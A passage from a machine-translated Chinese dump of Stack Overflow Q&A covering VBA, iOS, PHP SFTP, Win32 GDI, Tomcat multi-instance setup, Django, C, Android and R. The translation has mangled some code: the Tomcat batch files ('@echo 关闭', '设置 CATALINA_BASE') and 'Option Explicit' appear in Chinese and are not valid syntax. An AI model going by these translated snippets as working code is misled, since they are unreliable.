            pptApp.ActiveWindow.Selection.ShapeRange.Align msoAlignCenters, True
            pptApp.ActiveWindow.Selection.ShapeRange.Align msoAlignMiddles, True
          End With
          Current_slide = Current_slide + 1
        Next objChartObject
      End If
    Next ws 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:26:24.273

在模块顶部添加：

选项显式

然后尝试这些更改（主要是aircode，但这是一个开始）：

```
Dim Current_slide as Long
Dim pptSlide as PowerPoint.Slide
Dim oShRange as PowerPoint.ShapeRange

' I don't know why exactly you're using FindBySildeID
' Care to explain that?
Current_slide = pptPres.Slides.FindBySlideID(258).SlideIndex

    For Each ws In ActiveWorkbook.Worksheets
      'Verify if there is a chart object to transfer

' Don't really need this; if count is 0, the code within the
' For Each loop won't execute:
'      If ws.ChartObjects.Count > 0 Then
        For Each objChartObject In ws.ChartObjects
          Set objChart = objChartObject.Chart
          'ppLayoutBlank = 12
'         This needs a LONG not an object, so 
          Set pptSld = pptPres.Slides.FindBySlideID(Current_slide)

' You don't really need to GoTo the slide in order to operate on it          
' Doing so will slow things down; if you want to see it work, though, 
' uncomment:
'         pptApp.ActiveWindow.View.GotoSlide (pptSld)

          With objChart
           'Copy chart object as picture
            objChart.CopyPicture xlScreen, xlBitmap, xlScreen

            'Paste copied chart picture into new slide
'            pptSld.Shapes.Paste.Select
            Set oShRange = pptSld.Shapes.Paste
            With oShRange
              .Align msoAlignCenters, True
              .Align msoAlignMiddles, True
            End With  ' oShRange

          End With  
          Current_slide = Current_slide + 1
        Next objChartObject
 '     End If
    Next ws 
```

# iphone - 从文本字段跳转到文本字段时移动视图

> ID：16110522
> 
> 赞同：0
> 
> 时间：2013-04-19T17:42:52.427
> 
> 标签：iphone, xcode4.6

我有一个滚动视图上有几个文本字段的表单。我试图解决键盘隐藏一些文本字段的问题，我部分做到了。至少当我点击每个单独的字段时效果很好。我使用了推荐的 Apple 方法：

我已经在 viewDidLoad 中注册了键盘通知：

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillShow:) name:UIKeyboardWillShowNotification object:self.view.window];                                       
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillHide:) name:UIKeyboardWillHideNotification object:self.view.window]; 
```

我正在跟踪活动文本字段：

```
- (void)textFieldDidBeginEditing:(UITextField *)textField {
    activeTextField = textField;
}

- (void)textFieldDidEndEditing:(UITextField *)textField {
    activeTextField = nil;
} 
```

当键盘出现时，我正在向上滚动视图：

```
- (void)keyboardWillShow:(NSNotification *)aNotification {
    // Get the size of the keyboard
    NSDictionary* info = [aNotification userInfo];
    keyboardHeight = [[info objectForKey:UIKeyboardFrameBeginUserInfoKey] CGRectValue].size.height;

    UIEdgeInsets contentInsets = UIEdgeInsetsMake(0.0, 0.0, keyboardHeight, 0.0);
    scrollView.contentInset = contentInsets;
    scrollView.scrollIndicatorInsets = contentInsets;

    // If active text field is hidden by keyboard, scroll it so it's visible
    CGRect aRect = self.view.frame;
    aRect.size.height -= keyboardHeight + 44 + 44; // Compensates for Navbar and text field height
    if (!CGRectContainsPoint(aRect, activeTextField.frame.origin) ) {
        [scrollView scrollRectToVisible:activeTextField.frame animated:YES];
    }
} 
```

然后，当键盘隐藏时，我将视图滚动回默认值（我不会粘贴代码，因为它工作正常）。

但是，在我的 5 个文本字段中，前 4 个在键盘上有一个 Next 按钮（而不是 Return），而最后一个字段有 Done。这个想法是我希望用户从一个文本字段跳转到另一个文本字段（在我的情况下，一个方向就足够了）。所以，我也实现了一个 UITextField 委托方法来处理它：

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField {
    if (textField == firstNameTextField) {
        [lastNameTextField becomeFirstResponder];

    } else if (textField == lastNameTextField) {
        [countryTextField becomeFirstResponder];

    } else if (textField == cityTextField) {
        [zipCodeTextField becomeFirstResponder];

    } else if (textField == zipCodeTextField) {
        [zipCodeTextField resignFirstResponder];
    }
    return NO;
} 
```

上面的中间文本字段被跳过，因为对于该文本字段，我使用了不同的输入类型（带有 UIPickerView 的自定义视图和顶部带有 Next 按钮的栏） - 缺少的代码在此方法中：

```
- (IBAction)goToNextTextField:(id)sender {
    [cityTextField becomeFirstResponder];
} 
```

好的，正如我已经提到的，即使键盘尺寸（标准 iOS 与我的自定义视图）的高度不同，在点击单个文本字段（然后关闭键盘）时视图调整效果很好。我还可以通过点击下一步按钮成功浏览所有文本字段。

这是我的问题：

*   当点击 Next 时，如果键盘没有改变（例如，从字段 4 到 5，两者都使用标准键盘），我的 keyboardWillShow: 方法没有被调用，NSLog 调试器将 keyboardHeight 显示为 0，但视图却不可预测地向上移动。
*   此外，当在字段 3（使用自定义输入视图的字段）之间导航时，不会重新计算键盘高度。我已经尝试注册到 UIKeyboardDidChangeFrameNotification 和 UIKeyboardWillChangeFrameNotification （指向keyboardWillShow：方法），但没有多大成功。值得注意的是，我确实在控制台中看到了keyboardHeight 正在发生变化，但它通常滞后一步，即keyboardHeight 在我离开现场时更新，而不是在它成为FirstResponder 时更新。

也许一双有经验的眼睛会发现我的错误，因为过去两天我一直在摧毁我的一双眼睛寻找解决方案。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T19:33:01.030

您可以使用 UITextField 委托。每当用户开始在任何文本字段中编辑其委托时，您都可以使用更改滚动视图偏移量

```
- (void)scrollViewToCenterOfScreen:(UIView *)theView 
{  
    CGFloat viewCenterY = theView.center.y;  
    CGRect applicationFrame = [[UIScreen mainScreen] applicationFrame];  

    CGFloat availableHeight = applicationFrame.size.height - 200;            // Remove area covered by keyboard  

    CGFloat y = viewCenterY - availableHeight / 2.0;  
    if (y < 0) 
    {  
        y = 0;  
    }  
    [scrollView  setContentOffset:CGPointMake(0, y+20) animated:YES]; 
} 
```

所以在 TextField 委托中你可以设置

```
- (BOOL)textFieldShouldBeginEditing:(UITextField *)textField
{
    if([textField isEqual:textfield1])
    {
         [self scrollViewToCenterOfScreen:textfield1];

    }
    else if([textField isEqual:textfield2])
    {
         [self scrollViewToCenterOfScreen:textfield2];

    }

return YES;
} 
```

当用户按下完成或返回按钮时，您可以将偏移更改为 (0,0)

```
 [scrollView setContentOffset:CGPointMake(0, 0) animated:YES]; 
```

希望这对你有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:44:25.070

[https://github.com/simonbs/BSKeyboardControls](https://github.com/simonbs/BSKeyboardControls)

像这样编辑文本字段时，此控件可以在键盘上方显示工具栏

![在此处输入图像描述](https://i.stack.imgur.com/vxhaa.png)

===========================================

```
-(void)textFieldDidBeginEditing:(UITextField *)textField {
    if (textField == firstNameTextField) {
         //move to firstNameTextField

    } else if (textField == lastNameTextField) {
         //move to lastNameTextField

    } else if (textField == cityTextField) {
         //move to cityTextField

    } else if (textField == zipCodeTextField) {
         //move to zipCodeTextField
    }
    return NO;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-07T21:29:28.990

我最终实施了一个适合我的解决方案。这是 Apple 推荐的方法、在这些论坛和我自己的论坛上找到的几个解决方案的混合体。

首先，在视图控制器 .h 文件中注册为 UITextFieldDelegate。

然后在 viewDidLoad 注册键盘通知：

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(keyboardWillShow:)
                                             name:UIKeyboardWillShowNotification
                                           object:self.view.window];
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(keyboardWillHide:)
                                             name:UIKeyboardWillHideNotification
                                           object:self.view.window]; 
```

不要忘记在 viewDidUnload 方法中取消注册（removeObserver :)。

让您的应用程序知道哪个文本字段当前处于活动状态：

```
- (void)textFieldDidBeginEditing:(UITextField *)textField {
    activeTextField = textField;
}

- (void)textFieldDidEndEditing:(UITextField *)textField {
    activeTextField = nil;
} 
```

当您的应用程序收到键盘将显示的通知时，它会调用此方法：

```
- (void)keyboardWillShow:(NSNotification *)aNotification {

    keyboardHeight = [[[aNotification userInfo] objectForKey:UIKeyboardFrameEndUserInfoKey] CGRectValue].size.height;

    [scrollView setFrame:CGRectMake(scrollView.frame.origin.x, 
                                    scrollView.frame.origin.y, 
                                    scrollView.frame.size.width, 
                                    scrollView.frame.size.height - keyboardHeight)];

    [self moveViewWithKeyboard];
} 
```

我在这里所做的只是将我的 scrollView 框架的大小减小键盘的大小。之后，我调用我的 moveViewWithKeyboard: 方法，该方法将使活动视图可见。

有趣的是，为了解决检测到正确的键盘高度为时已晚的问题（阅读我上面的原始问题），我不得不使用 UIKeyboardFrameEndUserInfoKey 参数更改键盘高度检测行中的参数 UIKeyboardFrameBeginUserInfoKey 。这样做之后，在移动到相关字段时会检测到键盘（或自定义视图），而不是在离开时检测到键盘（或自定义视图）。

当然，当键盘隐藏时，我必须恢复原始视图框架（请注意，我仍在调用 moveViewWithKeyboard: 方法，并将 nil 作为参数）：

```
- (void)keyboardWillHide:(NSNotification *)aNotification {

    [scrollView setFrame:CGRectMake(scrollView.frame.origin.x, 
                                    scrollView.frame.origin.y, 
                                    scrollView.frame.size.width, 
                                    scrollView.frame.size.height + keyboardHeight)];

    [self moveViewWithKeyboard];
} 
```

当未触发键盘隐藏/显示时，我还添加了移动视图的调用。当我从文本字段跳转到以系统键盘作为输入的文本字段时会发生这种情况，因此它既不会隐藏也不会再次显示（并且不会发出通知来触发委托方法）。

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField {

    if (textField == firstNameTextField) {
        [lastNameTextField becomeFirstResponder];
    } else if (textField == lastNameTextField) {
        [countryTextField becomeFirstResponder];
    } else if (textField == cityTextField) {
        [zipCodeTextField becomeFirstResponder];
    } else if (textField == zipCodeTextField) {
        [zipCodeTextField resignFirstResponder];
    }

    [self moveViewWithKeyboard:nil];

    return NO;
} 
```

最后是我移动视图的方法：

```
- (void)moveViewWithKeyboard {

    if (activeTextField) {
        [scrollView scrollRectToVisible:activeTextField.frame animated:YES];
    } else {
        [scrollView scrollRectToVisible:CGRectMake(0, 0, 1, 1) animated:YES];
    }
} 
```

请注意，当没有文本字段作为参数传递时（即没有文本字段处于活动状态），视图将滚动到其原始位置。

希望这可以帮助某人。

# php - 无法使用php从服务器获取文件

> ID：16110523
> 
> 赞同：0
> 
> 时间：2013-04-19T17:42:53.670
> 
> 标签：php, ftp, ftps

我需要使用 php 代码从服务器（SFTP）获取文件并将其保存在我的本地计算机中。我为此使用 ftp_ssl_connect()。代码是

```
$local_file = '/var/www/filename.csv';
$server_file = '/foldername/filename.csv';
$ftp_connection = ftp_ssl_connect('example.com','port');
$login_result = ftp_login($ftp_connection, 'username', 'password');
if (ftp_get($ftp_connection, $local_file, $server_file, FTP_BINARY)) {
    echo "Successfully written to $local_file\n";
} else {
    echo "There was a problem\n";
}

ftp_close($ftp_connection); 
```

但我得到的错误是

```
'Fatal error: Call to undefined function ftp_ssl_connect()' 
```

那么除了这个方法还有其他方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T01:02:52.427

FTPS 和 SFTP 不是一回事。对于 SFTP，请尝试[phpseclib，一个纯 PHP SFTP 实现](http://phpseclib.sourceforge.net/)。例如。

```
<?php
include('Net/SFTP.php');

$sftp = new Net_SFTP('www.domain.tld');
if (!$sftp->login('username', 'password')) {
    exit('Login Failed');
}

echo $sftp->get('filename.remote');
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:47:10.493

检查您的 phpinfo() 以确保 OpenSSL 和 ftp 模块都在那里。

从 ftp_ssl_connect() 上的 PHP.net 页面

> 注意：为什么这个函数可能不存在 ftp_ssl_connect() 仅当 ftp 模块和 OpenSSL 支持都静态内置到 php 中时才可用，这意味着在 Windows 上这个函数将在官方 PHP 构建中未定义。要使此功能在 Windows 上可用，您必须编译自己的 PHP 二进制文件。

哦，另一种方法是可能使用安全的 curl 调用。

[http://www.linuxformat.co.uk/wiki/index.php/PHP_-_The_Curl_library](http://www.linuxformat.co.uk/wiki/index.php/PHP_-_The_Curl_library)

[http://php.net/manual/en/book.curl.php](http://php.net/manual/en/book.curl.php)

# c++ - 在 C++ 中使用 FillRect()

> ID：16110527
> 
> 赞同：7
> 
> 时间：2013-04-19T17:43:05.887
> 
> 标签：c++, visual-c++, graphics, gdi

我是在 Visual C++ 中使用图形的新手。我只是想制作一个填充颜色的矩形。需要帮助来纠正这个...

```
RECT rect;
HDC hdc;
hdc=CreateDC(TEXT("DISPLAY"),NULL,NULL,NULL);
rect.left=30;
rect.right=100;
rect.top=50;
rect.bottom=200;
FillRect(hdc,&rect,(HBRUSH)(RGB(40,151,151))); 
```

错误是：

`ERROR: The variable 'rect' is being used without being initialized.`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T17:52:17.550

这通常是警告，而不是错误。在这种情况下，它也似乎是虚假的。

如果你初始化它*可能会*更好：

```
HDC hdc=CreateDC(TEXT("DISPLAY"),NULL,NULL,NULL);
RECT rect = {30, 50, 100, 200};
HBRUSH brush = CreateSolidBrush(RGB(50, 151, 151));

FillRect(hdc, &rect, brush);

DeleteObject(brush); 
```

请注意使用`CreateSolidBrush`-- 将颜色投射到 HBRUSH 似乎不太可能起作用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T18:27:30.540

由于此代码，您的代码失败：

```
(HBRUSH)(RGB(40,151,151)) 
```

您不能以`HBRUSH`任何有意义的方式将 RGB 颜色转换为。获得一个的唯一方法`HBRUSH`是要求系统给你一个。

因此，您需要为此目的使用其中一个 API 函数创建一个真正的画笔。例如，`CreateSolidBrush`。

```
HBRUSH hBrush = CreateSolidBrush(RGB(40,151,151)); 
```

刷完后，调用`DeleteObject`资源返回系统。

作为一般规则，每次编写演员表时，都将代码视为非常可疑。始终努力编写没有强制转换的代码。

# windows - Tomcat同时多个实例

> ID：16110528
> 
> 赞同：29
> 
> 时间：2013-04-19T17:43:06.740
> 
> 标签：windows, tomcat, multiple-instances, catalina

我正在尝试运行 Tomcat 的多个实例，但即使在配置不同的端口来侦听和关闭第二个实例之后，它仍会继续尝试侦听 8080（为 8081 配置）。我读到我必须为`CATALINA_BASE`. 从网上的所有文章来看，都没有真正显示可以在哪个文件中设置此变量。

在哪里以及如何为我的 Tomcat 实例设置 CATALINA_BASE`C:\apache-tomcat-7.0.39`

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2014-02-21T21:39:02.243

假设您在**C:\apache-tomcat-7.0.39**中只有一个 Tomcat 文件夹，并且您希望从中运行两个实例。

确保您设置了**CATALINA_HOME**系统/用户变量，并指向**C:\apache-tomcat-7.0.39**

1.  创建文件夹 C:\instance1。从 C:\apache-tomcat-7.0.39复制**conf**、**webapps**和**temp**文件夹并将它们粘贴到 C:\instance1。您可以从位于 instance1 下的 webapps 和 temp 文件夹中删除内容，但不要触摸**conf**内容。

2.  现在复制>粘贴 C:\instance1 并将其重命名为 instance2。这样，**instance1**和**instance2**将具有相同的内容。

3.  转到 C:\instance2\conf，编辑**server.xml**并更改这些端口的编号（我将它们标记为 XXXX）：

    `<Server port="XXXX" shutdown="SHUTDOWN">`

    `<Connector port="XXXX" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" />`

    `<Connector port="XXXX" protocol="AJP/1.3" redirectPort="8443" />`

4.  将您想要的任何内容部署到 instance1\webapps 和 instance2\webapps

5.  在 C:\ 下创建以下 4 个批处理文件

**instance1_startup.bat**

> @echo 关闭
> 
> 设置 CATALINA_BASE=C:\instance1
> 
> cd "%CATALINA_HOME%\bin"
> 
> 设置 TITLE=我的 Tomcat 实例 01
> 
> 调用startup.bat %TITLE%

**instance1_shutdown.bat**

> @echo 关闭
> 
> 设置 CATALINA_BASE=C:\instance1
> 
> cd "%CATALINA_HOME%\bin"
> 
> 调用shutdown.bat

**instance2_startup.bat**

> @echo 关闭
> 
> 设置 CATALINA_BASE=C:\instance2
> 
> cd "%CATALINA_HOME%\bin"
> 
> 设置 TITLE=我的 Tomcat 实例 02
> 
> 调用startup.bat %TITLE%

**instance2_shutdown.bat**

> @echo 关闭
> 
> 设置 CATALINA_BASE=C:\instance2
> 
> cd "%CATALINA_HOME%\bin"
> 
> 调用shutdown.bat

1.  运行**instance1_startup.bat**和**instance2_startup.bat**，希望它可以工作。

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2013-04-19T17:52:46.223

我运行两个 Tomcat 副本的最简单方法涉及以下步骤（我试图运行两个不同版本的 Tomcat，6 和 7）：

*   在不同的文件夹中建立2个tomcat副本（如果它们是不同的版本，那么这很容易，如果它们是相同的版本，那么你需要以其他方式区分。Tomcat创建了很多文件来管理它以便运行具有相同工作目录的两个实例可能是不可能的）

*   更改tomcat正在监听的以下端口`server.xml`

    *   `<Connector port="8080">`<- 这是tomcat用来响应HTTP请求的端口
    *   `<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />`<- 这定义了两个端口，一个用于 AJP 连接器（如果您在 Apache 或 IIS 服务器后面使用 tomcat），另一个用于 HTTPS 流量
    *   `<Server port="8005" shutdown="SHUTDOWN">`<- 这是 Tomcat 用来响应 SHUTDOWN 事件的端口

最后，如果您将其作为 Windows 服务运行，则需要为每个实例建立不同的服务名称（您可以在设置期间执行此操作，Tomcat 7 的默认值为 tomcat7）。一旦 Tomcat 运行，它的所有配置字段都使用相对路径，因此您无需触摸`CATALINA_BASE`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T17:51:48.857

如果您没有通过设置 CATALINA_BASE 目录为多个实例配置 Tomcat，则 $CATALINA_BASE 将设置为 $CATALINA_HOME 的值，即您安装 Tomcat 的目录。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-10T12:25:47.910

最简单的方法是下载另一个tomcat 8或9并安装它，同时安装更改所有端口号。复制现有实例并在 server.xml 中几乎不更改端口号可能会导致服务出现一些错误。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2016-11-17T13:55:29.453

```
1\. 1st create one bat file(tomcat-start1.bat) and add the below code and keep   this bat file in any location.create instance(a folder having with webapps, config, bin folders) or give directly location in "newins" tomcat folder. and change the port numbers as 8181 in server.xml.
@echo off

set javabin=C:\Program Files\Java\jdk1.8.0_101\bin
set apachehom=E:\Apache Tomcat 8.0.15
set newins=E:\my_instance_1 (or)E:\Apache Tomcat 8.0.15

start "Tomcat 01" "%javabin%\java.exe" ^
-Djava.util.logging.config.file="%apachebas%\conf\logging.properties" ^
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager ^
-Djava.util.logging.config.file="%apachebas%\conf\logging.properties" ^
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager ^
-Djava.endorsed.dirs="%apachehom%\endorsed" ^
-classpath "%apachehom%\bin\bootstrap.jar;%apachehom%\bin\tomcat-juli.jar" ^
-Dcatalina.base="%newins%" ^
-Dcatalina.home="%apachehom%" ^
-Djava.io.tmpdir="%apachebas%\temp" ^
org.apache.catalina.startup.Bootstrap  start

exit

2\. create java class and add this code and run
import java.io.IOException;
import java.io.InputStream;
import javax.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

@Controller
@RequestMapping("/hello")
public class TomcatInstance {

    @RequestMapping(method = RequestMethod.GET)
    public void printHello(ModelMap model) {

        Runtime runtime = Runtime.getRuntime();
        try {
            Process p1 = runtime.exec("cmd /c start E:\\Jammulaiah\\Sample\\tomcat-start1.bat");
            InputStream is = p1.getInputStream();
             int i = 0;
             StringBuffer sb=new StringBuffer();
             while ((i = is.read()) != -1) {
             sb.append((char) i);
             System.out.println(sb.toString());
             }
        } catch (IOException ioException) {
            System.out.println(ioException.getMessage());
        }

    }

} 
```

# python - 基于 django 类的视图 get_context_data 得到了一个意想不到的关键字争论

> ID：16110534
> 
> 赞同：1
> 
> 时间：2013-04-19T17:43:33.213
> 
> 标签：python, django, django-forms, django-class-based-views

我正在尝试从基于 django 类的视图中执行 CRUD 应用程序。这是我更新/创建笔记的观点。

```
class CreateNoteView(CreateView):

    model = Note
    template_name = 'edit_note.html'

    def get_success_url(self):
        return reverse('notes-list')

    def get_context_data(self):

        context = super(CreateNoteView, self).get_context_data(**kwargs)
        context['action'] = reverse('notes-create')
        return context

class UpdateNoteView(UpdateView):

    model = Note
    template_name = 'edit_note.html'

    def get_success_url(self):
        return reverse('notes-list')

    def get_context_data(self, **kwargs):

        context = super(UpdateNoteView, self).get_context_data(**kwargs)
        context['action'] = reverse('notes-edit',
                                    kwargs={'pk':self.get_object().id})
        return context 
```

这是我的模型文件：

```
# Create your models here.
class Note(models.Model):

    title = models.CharField(max_length=200)
    description = models.TextField()
    pub_date = models.DateField(auto_now_add=True) 
```

我的网址文件如下所示：

```
urlpatterns = patterns('',
       url(r'^create/$',CreateNoteView.as_view(), name='notes-create',),
       url(r'^$', ListNoteView.as_view(), name='notes-list',),    
       url(r'^edit/(?P<pk>\d+)/$', UpdateNoteView.as_view(), name='notes-edit',),                       
) 
```

模板如下：

```
{% if note.id %}
<h1> Edit Note </h1>
{% else %}
<h1>Add Notes</h1>
{% endif %}

<form action="{{ action }}" method="POST">
  {% csrf_token %}
  <ul>
    {{ form.as_p }}
  </ul>
  <input type="submit" value="Save" />
</form>
<a href="{% url "notes-list" %}">back to list</a> 
```

我收到一个错误，

**异常类型：/create/ 处的 TypeError**

**异常值：get_context_data() 得到了一个意外的关键字参数 'form'**

这是回溯：

```
File "/home/.virtualenvs/djtalk/local/lib/python2.7/site-packages/django/core/handlers/base.py" in get_response
  115\.                         response = callback(request, *callback_args, **callback_kwargs)
File "/home/.virtualenvs/djtalk/local/lib/python2.7/site-packages/django/views/generic/base.py" in view
  68\.             return self.dispatch(request, *args, **kwargs)
File "/home/.virtualenvs/djtalk/local/lib/python2.7/site-packages/django/views/generic/base.py" in dispatch
  86\.         return handler(request, *args, **kwargs)
File "/home/.virtualenvs/djtalk/local/lib/python2.7/site-packages/django/views/generic/edit.py" in get
  195\.         return super(BaseCreateView, self).get(request, *args, **kwargs)
File "/home/.virtualenvs/djtalk/local/lib/python2.7/site-packages/django/views/generic/edit.py" in get
  155\.         return self.render_to_response(self.get_context_data(form=form))

Exception Type: TypeError at /create/
Exception Value: get_context_data() got an unexpected keyword argument 'form' 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-19T18:02:49.653

更新

```
def get_context_data(self): 
```

到`CreateNoteView`：

```
def get_context_data(self, **kwargs): 
```

* * *

当您覆盖一个方法时（在这种情况下：`get_context_data`），您应该确保尽可能保持相同的签名：在这种情况下，`get_context_data`预计会收到`self, **kwargs`.

* * *

关于您的评论：

```
class NoteMixin(object):

    model = Note
    template_name = 'edit_note.html'

    def get_success_url(self):
        return reverse('notes-list')

     def get_context_data(self, **kwargs):
        context = super(NoteMixin, self).get_context_data(**kwargs)
        context['action'] = self.get_action()
        return context

class UpdateNoteView(NoteMixin, UpdateView):
    def get_action(self):
        return reverse('notes-edit', kwargs={'pk':self.get_object().id})

class CreateNoteView(NoteMixin, CreateView):
    def get_action(self):
        return reverse('notes-create') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T17:58:41.050

检查您的 CreateNoteView.get_context_data 函数签名 - /create/ 映射到您的 urls.py 中的 CreateNoteView

# java - 在终端窗口中运行 java 应用程序：没有这样的文件或目录？

> ID：16110537
> 
> 赞同：0
> 
> 时间：2013-04-19T17:43:50.103
> 
> 标签：java, eclipse, terminal

我正在为 java 使用 Eclipse，我刚刚创建了一个我试图在 Mac 的终端窗口上运行的程序。每次我尝试运行它时，我都会得到一个没有这样的文件或目录。在终端窗口中，我移至源文件夹。这是我应该从 Eclipse 运行 java 程序的地方吗？下面列出了我的命令，其中包含两个文本文件 (in1.txt) 和 (in2.txt)。

```
java Cat in1.txt in2.txt out.txt 
```

下面提供了我的代码。

```
public class Cat {
public static void main(String[] args) {
    Out out = new Out(args[args.length -1]);
    for(int i = 0; i < args.length -1; i++)
    {
        In in = new In(args[i]);
        String s = in.readAll();
        out.println(s);
        in.close();
    }
    out.close();

  }
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:00:39.967

`cd`到运行命令`Cat.class`之前所在的目录。`java`

# gist - 要点中的内联提交注释？

> ID：16110541
> 
> 赞同：2
> 
> 时间：2013-04-19T17:44:06.447
> 
> 标签：gist

有没有办法在要点上做内联提交注释？

可以在任何普通的 github 存储库上实现这种功能，例如代码审查（参见[http://astrofrog.github.io/blog/2013/04/10/how-to-conduct-a-full-code -review-on-github/](http://astrofrog.github.io/blog/2013/04/10/how-to-conduct-a-full-code-review-on-github/)）。要点怎么样？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2014-01-17T13:32:06.483

不。

不过，您可以通过 gist API 为此构建一个站点。

# pdf - 将页面映射与 PDF 相结合，以便注释随更新的 PDF 中的页面移动

> ID：16110542
> 
> 赞同：1
> 
> 时间：2013-04-19T17:44:08.543
> 
> 标签：pdf, annotations

有没有人设法为最终用户提供更新的 PDF，允许该用户将他的本地注释转移到新的 PDF 并将注释保留在正确的页面上，即使在更新 PDF 的早些时候插入了页面PDF比注释。

我认为可能有人使用了页面地图或页面指南方法。

抱歉 - 我希望这很清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T13:36:25.707

您可以使用页面内容流代替使用页面索引作为页面的 ID（在解码/解压缩之后）。大多数 PDF 库都会让您访问它，因此您可以从页面内容计算 MD5 散列并在“更新”文件中搜索它，以便知道将注释传输到哪里。

这是假设页面内容确实相同，这不是常见的情况。

# c - 为什么编译器允许自己初始化变量？

> ID：16110546
> 
> 赞同：9
> 
> 时间：2013-04-19T17:44:53.990
> 
> 标签：c

我终于找到了一个错字错误，类似于以下代码。但是编译器不应该检测到这个（默认选项）吗？

```
#include <stdio.h>

int main()
{
    int c = c;
    return printf("%d\n", c);
}

$ gcc --version        
gcc (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T17:48:58.397

我不明白为什么它不会编译。定义发生在初始化之前。当然，这种初始化是没有意义的，但是，从编译器的角度来看，它没有理由不起作用。

C 没有像 C# 这样更现代的语言所具有的相同类型的保护。C# 编译器会给出错误，表明您正在使用未分配的变量。C不在乎。它不会保护你免受自己的伤害。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T19:36:57.327

在自己的初始化程序中使用变量是完全合法的。考虑一个链表：

```
#include <stdio.h>
struct node { struct node *prev, *next; int value; };
int main() {
    struct node l[] = {{0, l + 1, 42}, {l, l + 2, 5}, {l, 0, 99}};
    for (struct node *n = l; n; n = n->next)
        printf("%d\n", n->value);
    return 0;
} 
```

一般来说，诊断何时使用未初始化的值是一个难题。尽管某些编译器在某些情况下可以检测到它，但要求它发生是没有意义的。

# android - 如何区分 android ScrollView 的最终用户滚动和程序滚动？

> ID：16110552
> 
> 赞同：7
> 
> 时间：2013-04-19T17:45:04.370
> 
> 标签：android, scrollview

**背景：**我有一个 ScrollView / TextView 对，它从外部源接收间歇性的文本流。它会在每次更新时自动滚动到底部。

我希望用户能够通过手动滚动到某个地方来打破自动向下滚动模式，但是我不清楚如何区分手动滚动和我自己正在做的编程滚动。

我的 UI 更新在计时器上运行以缓冲重绘：

```
private Handler outputUpdater = new Handler ();
private static String outputBuffer = "";
private static boolean outputHasChanged = false;
private static final Object lock = new Object ();

private Runnable outputUpdaterTask = new Runnable () {
    public void run () {
        synchronized (lock) {

            // if the output has changed, update the TextView
            if (outputHasChanged) {
                TextView tv = (TextView) findViewById (R.id.textView);
                tv.setText (outputBuffer);
            }

            // if the output has changed, or the scroll hasn't reached the bottom yet
            // then keep scrolling down
            if (outputHasChanged || !scrollAtBottom ()) {
                ScrollView sv = (ScrollView) findViewById (R.id.scrollView);
                sv.fullScroll (View.FOCUS_DOWN);
            }

            outputHasChanged = false;
        }

        outputUpdater.postDelayed (this, 100);
    }
}; 
```

`scrollAtBottom``onScrollChanged`从处理程序获取它的值。

这一切都很好。`fullScroll`即使没有文本更新也有必要调用，因为`fullScroll`如果有 TextView 更新或虚拟键盘可见性发生变化等，单个调用并不总是到达底部。

我希望如果用户手动滚动，我可以知道做出停止调用的决定`fullScroll`。

不幸的是，仅仅将任何从“在底部，自动模式”到“不在底部”的转换视为切换到手动模式的提示似乎还不够，因为各种 UI 更改似乎也将滚动视图从底部移开（例如虚拟键盘显示）。

**问题重述：** 如何区分用户启动的滚动和程序滚动？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-19T17:57:35.697

您是否尝试过使用`boolean`with `onTouchEvent`，类似于：

```
boolean userIntercept = false;
@Override
public boolean onTouchEvent(MotionEvent me) {
    int action = me.getAction();
    if (action == MotionEvent.ACTION_MOVE) {
            userIntercept = true;
    }
    return super.onTouchEvent(me);
} 
```

然后在你的`outputUpdaterTask`：

```
// if the output has changed, or the scroll hasn't reached the bottom yet
// then keep scrolling down
if (outputHasChanged || !scrollAtBottom () && !userIntercept) {
    ScrollView sv = (ScrollView) findViewById (R.id.scrollView);
    sv.fullScroll (View.FOCUS_DOWN);
} 
```

您只需要确定一种可以返回`userIntercept`to的方式`false`，以最适合您的应用程序为准。

# r - 按行将矩阵列表组合成单个矩阵

> ID：16110553
> 
> 赞同：35
> 
> 时间：2013-04-19T17:45:09.087
> 
> 标签：r

假设我有一个矩阵列表（所有矩阵的列数都相同）。我将如何按行附加/组合这些矩阵（'行绑定'，`rbind`）以获得单个矩阵？

样本：

```
> matrix(1, nrow=2, ncol=3)
     [,1] [,2] [,3]
 [1,]    1    1    1
